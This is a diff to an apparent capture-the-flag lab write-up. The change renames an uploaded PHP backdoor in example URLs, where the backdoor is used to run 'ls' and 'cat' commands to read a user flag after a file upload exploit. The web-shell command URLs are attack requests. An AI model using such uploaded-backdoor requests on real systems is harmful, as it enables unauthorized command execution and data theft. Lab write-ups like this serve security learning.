@@ -93,12 +93,12 @@ Exploring the site reveals a file upload vulnerability which can be exploited us
 
 Using the preconfigured payload (`/usr/share/payloads/php`), when uploaded to run a `ls /home/labusr/` command it returns `user.txt`.
 ```URL
-http://139.144.167.25/uploads/yididiya_mandefro_simple_backdor.php?cmd=ls%20%2fhome%2flabuser
+http://139.144.167.25/uploads/test_simple_backdor.php?cmd=ls%20%2fhome%2flabuser
 ```
 
 using `cat` on the file returns the flag (This flag could also be gained through SSH): `flag{web_sqli_cmd_inject_upload}`
 ```URL
-http://139.144.167.25/uploads/yididiya_mandefro_simple_backdor.php?cmd=cat%20%2fhome%2flabuser%2fuser.txt
+http://139.144.167.25/uploads/test_simple_backdor.php?cmd=cat%20%2fhome%2flabuser%2fuser.txt
 ```
 
 ## SSH privilege escalation
